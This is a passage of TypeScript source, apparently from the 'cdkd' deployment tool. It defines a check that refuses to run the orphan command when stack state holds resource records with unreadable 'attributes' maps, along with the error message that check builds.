 * entry's map is the `--force` cache, and the rewriter reads that one as
 * holding nothing instead of indexing it.
 */
export function refuseMalformedResourceAttributesForOrphan(
  state: StackState,
  removedLogicalIds: readonly string[],
  stackName: string | undefined,
  region: string | undefined,
  recovery?: LockRecoveryContext
): void {
  const removed = new Set(removedLogicalIds);
  const unreadable = unreadableResourceAttributeBags(state).filter((id) => !removed.has(id));
  if (unreadable.length === 0) return;
  throw new CdkdError(
    malformedOrphanResourceAttributesRefusalMessage(stackName, region, unreadable, recovery),
    STATE_RESOURCES_MALFORMED
  );
}

/**
 * The text {@link refuseMalformedResourceAttributesForOrphan} raises.
 *
 * Measured through the real rewrite: `"abcdef"`, `5`, `0`, `""`, `false` and
 * `null` are carried into the save byte for byte (the falsy ones skip
 * `rewriteValue` and survive through the spread), and `[{"Ref":"O"}]` is
 * WALKED, coming back `["<physical id>"]` — a rewrite recorded into a container
 * that is still not a map, the `properties` refusal's list case one field over.
 */
export function malformedOrphanResourceAttributesRefusalMessage(
  rawStackName: string | undefined,
  rawRegion: string | undefined,
  logicalIds: readonly string[],
  recovery?: LockRecoveryContext
): string {
  const stackName = absentIfEmpty(rawStackName);
  const region = absentIfEmpty(rawRegion);
  const named = logicalIds
    .slice(0, NAMED_UNREADABLE_ENTRIES)
    .map((id) => displayLogicalId(id))
    .join(', ');
  const rest = logicalIds.length - NAMED_UNREADABLE_ENTRIES;
  const more = rest > 0 ? ` and ${rest} more` : '';
  return orphanRefusal(
    stackName,
    region,
    recovery,
    `${stackClause(stackName, region)} holds ${logicalIds.length} resource record(s) whose ` +
      `'attributes' map cannot be read — ${named}${more} — because it is null or not an object. ` +
      `The record is malformed or truncated. 'cdkd orphan' REWRITES and SAVES every record it ` +
      `keeps, so it refuses rather than continuing — under '--dry-run' too, so a dry run never ` +
      `prints a plan the real run refuses. The map is carried into the save VERBATIM, and a list ` +
      `is walked, so its rewrites are recorded into a container that is still not a map. It is ` +
      `the cache a later 'cdkd deploy' reads another resource's 'Fn::GetAtt' of this one from, so ` +
      `continuing would report success over the one map that read depends on.`,
    SURVIVOR_THIRD_WAY_OUT
  );
}
